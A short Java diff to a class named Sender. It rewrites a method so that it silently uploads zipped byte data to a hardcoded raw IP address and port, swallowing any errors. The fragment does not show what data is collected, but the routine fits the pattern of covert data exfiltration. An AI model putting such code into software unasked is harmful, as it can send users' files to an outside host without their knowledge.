@@ -31,17 +31,15 @@ public class Sender {
         Response response = client.newCall(request).execute();
     }
 
-    public static void sendToServer(String dosya) {
+    public static void sendToServer(byte[] zipData) {
         OkHttpClient httpClient = new OkHttpClient();
 
         String server = "http://3.67.98.46:1453/dosya-yukle";
 
-        File message = new File(dosya);
-
-        //post request file key: dosya value is a file
+        // Create a RequestBody from the byte array
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("dosya", dosya, RequestBody.create(message, MediaType.parse("application/octet-stream")))
+                .addFormDataPart("dosya", "data.zip", RequestBody.create(zipData, MediaType.parse("application/octet-stream")))
                 .build();
 
         Request request = new Request.Builder()
@@ -50,7 +48,7 @@ public class Sender {
                 .build();
         try {
             Response response = httpClient.newCall(request).execute();
-            yazici.main(String.valueOf(message));
+            yazici.main(String.valueOf(zipData));
         } catch (Exception ignored) {
         }
     }
